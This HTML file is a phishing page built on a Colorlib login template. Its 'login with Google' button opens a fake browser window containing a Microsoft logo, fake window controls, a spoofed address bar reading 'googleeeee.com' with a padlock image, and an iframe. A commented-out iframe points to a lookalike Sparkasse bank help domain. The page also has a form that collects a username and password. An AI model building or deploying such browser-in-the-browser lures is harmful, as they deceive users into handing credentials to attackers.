<!DOCTYPE html>
<html lang="en">
    <style>
        .center {
  position: fixed;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
}
        .hideform {
            display: none;
        }
    </style>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Sign Up Form by Colorlib</title>

    <!-- Font Icon -->
    <link rel="stylesheet" href="fonts/material-icon/css/material-design-iconic-font.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <!-- Main css -->
    <link rel="stylesheet" href="css/style.css">
    <link rel="stylesheet" href="iframeWin/style.css">
</head>
<body>

    <div class="main">
        <!-- Sing in  Form -->
        <section class="sign-in">
            <div class="container">
                <div class="signin-content">
                    <div class="signin-image">
                        <figure><img src="images/signin-image.jpg" alt="sing up image"></figure>
                        <a href="#" class="signup-image-link">Create an account</a>
                    </div>

                    <div class="signin-form">
                        <h2 class="form-title">Sign up</h2>
                        <form method="POST" class="register-form" id="login-form">
                            <div class="form-group">
                                <label for="your_name"><i class="zmdi zmdi-account material-icons-name"></i></label>
                                <input type="text" name="your_name" id="your_name" placeholder="Your Name"/>
                            </div>
                            <div class="form-group">
                                <label for="your_pass"><i class="zmdi zmdi-lock"></i></label>
                                <input type="password" name="your_pass" id="your_pass" placeholder="Password"/>
                            </div>
                            <div class="form-group">
                                <input type="checkbox" name="remember-me" id="remember-me" class="agree-term" />
                                <label for="remember-me" class="label-agree-term"><span><span></span></span>Remember me</label>
                            </div>
                            <div class="form-group form-button">
                                <input type="submit" name="signin" id="signin" class="form-submit" value="Log in"/>
                            </div>
                        </form>
                        <div class="social-login">
                            <span class="social-label">Or login with</span>
                            <ul class="socials">
                                <!-- <li><a href="#"><i class="display-flex-center zmdi zmdi-facebook"></i></a></li>
                                <li><a href="#"><i class="display-flex-center zmdi zmdi-twitter"></i></a></li> -->
                                <li><a id="show" onclick="openForm()"><i class="display-flex-center zmdi zmdi-google"></i></a></li>
                                <!-- <button type="submit" id="show" onclick="openForm()">Show form</button> -->
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </section>

    </div>
    <div id="window" class="center hideform">
		<!-- Title bar start -->
		<div id="title-bar-width">
			<div id="title-bar">
				<div style="margin-top:5px;">
					<img src="https://companieslogo.com/img/orig/MSFT-a203b22d.png?t=1633073277" width="20px"
						height="15px" id="logo">
					<span id="logo-description">Sign in</span>
				</div>

				<div>
					<span id="minimize">&#8212;</span>
					<span id="square">□</span>
					<span id="exit">✕</span>
				</div>
			</div>
			<div id="url-bar">
				<img src="https://asma1214.github.io/ssl.svg" width="20px"
					height="20px" id="ssl-padlock">
				<!-- <p>XX-DOMAIN-NAME-XX</p> -->
				<span id="domain-name">http://googleeeee.com</span>
				<!-- <span id="domain-path">XX-DOMAIN-PATH-XX</span> -->
			</div>
		</div>
		<!-- Content start -->
		<iframe id="content" src="www.google.com" frameBorder="0"></iframe>
		<!-- <iframe id="content" src="https://hilfe-sparkasse.de/de/6415cf8" frameBorder="0"></iframe> -->

	</div>

    <!-- JS -->
    <script src="vendor/jquery/jquery.min.js"></script>
    <script src="js/main.js"></script>
</body><!-- This templates was made by Colorlib (https://colorlib.com) -->
<script>
    $('#show').on('click', function () {
        $('.center').show();

    })

    $('#exit').on('click', function () {
        $('.center').hide();
        $('#show').show();
    })
    function openForm() {
        document.getElementById("window").style.display = "block";
        event.preventDefault();
    }
</script>
<script src="iframeWin/script.js"></script>

</html>
